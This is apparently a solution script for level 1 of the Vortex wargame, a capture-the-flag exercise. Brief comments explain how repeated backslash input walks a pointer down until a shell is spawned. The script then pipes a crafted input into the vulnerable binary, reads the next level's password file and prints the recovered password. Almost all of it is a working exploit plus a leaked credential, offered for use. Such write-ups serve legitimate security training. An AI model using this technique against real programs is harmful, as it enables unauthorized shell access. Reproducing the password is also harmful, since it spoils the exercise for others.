#!/bin/bash
# From vortex1.c we can see that input '\' will let the memory address of p reduce by 1
# We have to input a lot of '\' to make the memory address of ptr reach certain value (((unsigned int)ptr & 0xff000000) == 0xca000000)
# And also even the program will run the shell, but it ends immediately after that
# So we have to use cat to keep the shell running and input the command we want to execute 

(python3 -c 'import sys; sys.stdout.write("\\" * 899293448 + "a")';cat) | /vortex/vortex1
cat /etc/vortex_pass/vortex2
# password: WyEmn5wiX